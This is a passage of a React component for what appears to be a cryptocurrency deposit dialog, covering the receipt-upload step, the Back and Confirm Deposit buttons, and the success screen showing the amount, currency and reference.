                      ? "border-green-600 bg-green-600/10"
                      : "border-gray-300 dark:border-white/10 bg-gray-50 dark:bg-[#0d3320]/50"
                  }`}
                >
                  <input
                    type="file"
                    id="deposit-receipt"
                    accept="image/*"
                    onChange={handleFileInput}
                    className="hidden"
                  />
                  {receipt ? (
                    <div className="space-y-2">
                      <Check className="w-10 h-10 text-green-600 dark:text-green-400 mx-auto" />
                      <p className="text-xs text-gray-700 dark:text-gray-300">
                        {receipt.name}
                      </p>
                      <button
                        onClick={() => setReceipt(null)}
                        className="text-xs text-red-400 hover:underline"
                      >
                        Remove
                      </button>
                    </div>
                  ) : (
                    <label htmlFor="deposit-receipt" className="cursor-pointer">
                      <Upload className="w-10 h-10 text-gray-400 dark:text-gray-500 mx-auto mb-2" />
                      <p className="text-sm text-gray-700 dark:text-gray-300 font-medium mb-1">
                        Drop receipt here or click to browse
                      </p>
                      <p className="text-[10px] text-gray-500">
                        JPG, PNG, GIF (Max 10MB)
                      </p>
                    </label>
                  )}
                </div>
                {error && (
                  <p className="text-red-400 text-xs mt-2 flex items-center gap-1">
                    <AlertCircle className="w-3.5 h-3.5" />
                    {error}
                  </p>
                )}
              </div>

              {/* Action Buttons */}
              <div className="flex gap-3 pt-2 border-t border-gray-200 dark:border-white/10">
                <button
                  onClick={() => {
                    setStep("address");
                    setReceipt(null);
                    setError("");
                  }}
                  disabled={submitting}
                  className="flex-1 py-3 bg-gray-200 dark:bg-white/5 hover:bg-gray-300 dark:hover:bg-white/10 text-gray-900 dark:text-white rounded-lg font-semibold transition-colors disabled:opacity-50 text-sm"
                >
                  Back
                </button>
                <button
                  onClick={handleConfirmDeposit}
                  disabled={submitting || !receipt}
                  className="flex-1 py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition-colors disabled:opacity-50 flex items-center justify-center gap-2 text-sm"
                >
                  {submitting ? (
                    <>
                      <Loader2 className="w-4 h-4 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    "Confirm Deposit"
                  )}
                </button>
              </div>
            </div>
          )}

          {/* ==================== STEP: SUCCESS ==================== */}
          {step === "success" && selectedWallet && (
            <div className="p-6">
              <div className="text-center mb-6">
                <CheckCircle className="w-14 h-14 text-green-600 dark:text-green-400 mx-auto mb-3" />
                <h3 className="text-xl font-bold text-gray-900 dark:text-white mb-1">
                  Deposit Request Submitted!
                </h3>
                <p className="text-sm text-gray-500 dark:text-gray-400">
                  Your deposit is being processed
                </p>
              </div>

              <div className="bg-green-600/10 border border-green-500/20 rounded-xl p-4 mb-4 space-y-2 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-500 dark:text-gray-400">
                    Amount:
                  </span>
                  <span className="text-gray-900 dark:text-white font-semibold">
                    ${parseFloat(dollarAmount).toFixed(2)}
                  </span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-500 dark:text-gray-400">
                    Currency:
                  </span>
                  <span className="text-gray-900 dark:text-white font-semibold">
                    {currencyAmount} {selectedWallet.currency}
                  </span>
                </div>
                <div className="flex justify-between pt-2 border-t border-green-500/20">
                  <span className="text-gray-500 dark:text-gray-400">
                    Reference:
                  </span>
                  <span className="text-green-700 dark:text-green-400 font-semibold font-mono text-xs">
                    {depositReference}
                  </span>
                </div>
              </div>

              <div className="bg-green-600/10 border border-green-500/20 rounded-xl p-4 mb-4">
                <div className="flex items-start gap-2">
                  <Clock className="w-4 h-4 text-green-500 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="text-xs text-gray-700 dark:text-gray-300 font-medium">
                      Processing Time
                    </p>
                    <p className="text-[10px] text-gray-500 dark:text-gray-400 mt-0.5">
                      Your deposit will be credited within 30 minutes to 24
                      hours after verification.
                    </p>
                  </div>
                </div>
              </div>

              <button
                onClick={handleClose}
                className="w-full py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition-colors text-sm"
              >
                Got It!
              </button>
            </div>
          )}
        </motion.div>
      </div>
    </AnimatePresence>
  );
}
